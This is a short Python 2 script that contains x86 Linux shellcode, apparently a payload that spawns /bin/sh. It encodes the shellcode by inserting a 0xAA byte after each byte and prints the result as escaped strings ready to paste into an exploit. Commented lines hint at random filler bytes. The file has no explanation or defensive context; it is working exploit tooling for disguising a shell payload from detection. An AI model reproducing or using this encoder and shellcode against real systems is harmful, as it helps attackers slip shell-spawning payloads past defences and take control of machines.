#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x2f\x62\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded Shellcode....'

for x in bytearray(shellcode):

	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA
	
	# encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
        encoded2 += '%02x,' % x
        encoded2 += '0x%02x,' % 0xAA

	# encoded2 += '0x%02x' % random.randint(1,255)


print encoded + '\n'
print encoded2 + '\n'

print 'Len: %d' % len(bytearray(shellcode))

